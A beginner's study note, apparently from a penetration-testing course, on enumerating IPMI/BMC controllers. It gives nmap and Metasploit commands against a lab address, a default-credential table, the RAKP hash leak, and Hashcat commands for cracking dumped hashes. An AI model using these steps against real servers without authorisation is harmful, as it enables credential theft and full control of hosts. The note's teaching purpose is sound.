---
tags: [module/footprinting, ipmi, bmc, hardware, management, level/beginner]
---

# IPMI Enumeration - Beginner's Guide

## What is IPMI?

IPMI (Intelligent Platform Management Interface) is a standardized specification for hardware-based system management. Think of it as a "computer within your computer" that lets administrators manage servers remotely - even if the main server is powered off or crashed.

---

## Why IPMI Matters

IPMI is like having a tiny computer on your motherboard that:
- Runs independently of the main OS
- Has its own processor, memory, and network connection
- Can power servers on/off remotely
- Can monitor temperature, voltage, fans
- Can access BIOS settings remotely
- Works even when the main server is dead

**If you compromise IPMI, you effectively have PHYSICAL access to the server.**

---

## IPMI Components

| Component | Description |
|-----------|-------------|
| BMC | Baseboard Management Controller (the actual hardware chip) |
| ICMB | Intelligent Chassis Management Bus (inter-chassis communication) |
| IPMB | Intelligent Platform Management Bus (BMC communication) |
| IPMI Memory | Stores system event logs and repository data |

---

## Common BMC Vendors

| Vendor | Product | Default Credentials |
|--------|---------|---------------------|
| Dell | iDRAC (Integrated Dell Remote Access Controller) | root:calvin |
| HP | iLO (Integrated Lights-Out) | Administrator:random 8-char string |
| Supermicro | IPMI | ADMIN:ADMIN |
| IBM | IMM (Integrated Management Module) | USERID:PASSW0RD |
| Fujitsu | iRMC | admin:admin |

---

## IPMI Protocol Details

- **Port:** UDP 623
- **Version 2.0** is most common
- Supports serial over LAN (remote console access)
- Often exposes web interface, SSH, Telnet as well

---

## Footprinting IPMI

### Nmap UDP Scan

sudo nmap -sU --script ipmi-version -p 623 10.129.42.195

Output:
PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version: IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0

### Metasploit IPMI Version Scan

msf6 > use auxiliary/scanner/ipmi/ipmi_version
msf6 > set rhosts 10.129.42.195
msf6 > run

[+] 10.129.42.195:623 - IPMI-2.0 UserAuth(...) PassAuth(...)

---

## Default IPMI Credentials

| Vendor | Username | Password |
|--------|----------|----------|
| Dell iDRAC | root | calvin |
| HP iLO | Administrator | (random 8-char) |
| Supermicro | ADMIN | ADMIN |
| IBM IMM | USERID | PASSW0RD |
| Fujitsu iRMC | admin | admin |
| Cisco UCS | admin | password |

**Always try these!** Many administrators never change defaults.

---

## The IPMI Security Flaw (RAKP Protocol)

IPMI 2.0 has a critical design flaw in its RAKP (Remote Authenticated Key-Exchange Protocol) authentication process.

### What Happens

1. Client requests authentication
2. Server sends a salted SHA1 or MD5 hash of the user's password
3. This happens BEFORE authentication completes
4. ANY valid username will return a hash

### Why This Matters

- You can get password hashes WITHOUT logging in
- Just knowing a valid username (like ADMIN) is enough
- Hashes can be cracked offline with Hashcat
- HP iLO default passwords can be brute-forced

---

## Dumping IPMI Hashes with Metasploit

msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 > set rhosts 10.129.42.195
msf6 > run

[+] Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] Hash for user 'ADMIN' matches password 'ADMIN'

The module automatically cracks common passwords and can output hashes in Hashcat/John format.

---

## Cracking IPMI Hashes with Hashcat

### Hash Format
IPMI hashes use Hashcat mode 7300.

### Save Hash to File

ipmi.txt:
ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e

### Crack with Dictionary

hashcat -m 7300 ipmi.txt /usr/share/wordlists/rockyou.txt

### Crack HP iLO Default Password

HP iLO default passwords are 8 characters, uppercase letters and numbers only.

hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u

This tries all 8-char combinations of digits and uppercase letters.

---

## What You Can Do with IPMI Access

If you gain access to a BMC:

- Power cycle servers (turn them off/on)
- Mount ISO images remotely (install OS!)
- Access serial console
- View hardware logs
- Change BIOS settings
- Monitor system health
- Full control of the host

**BMC access = physical access equivalent**

---

## Dangerous IPMI Settings

| Setting | Risk |
|---------|------|
| Default passwords | Easy to guess |
| IPMI exposed to network | Anyone can dump hashes |
| Weak passwords | Crackable offline |
| Shared passwords | Password re-use across systems |
| No network segmentation | Attackers can reach BMCs |

---

## Key Takeaways

- IPMI runs on UDP port 623
- BMCs are independent management systems
- Default credentials are common (root:calvin, ADMIN:ADMIN)
- IPMI 2.0 has a design flaw that leaks password hashes
- ANY valid username will return a hash
- Hashes can be cracked offline with Hashcat
- HP iLO default passwords follow a pattern (8 chars, uppercase+numbers)
- BMC access = physical access to the server
- Always check for IPMI during internal pentests
- Password re-use is common after cracking
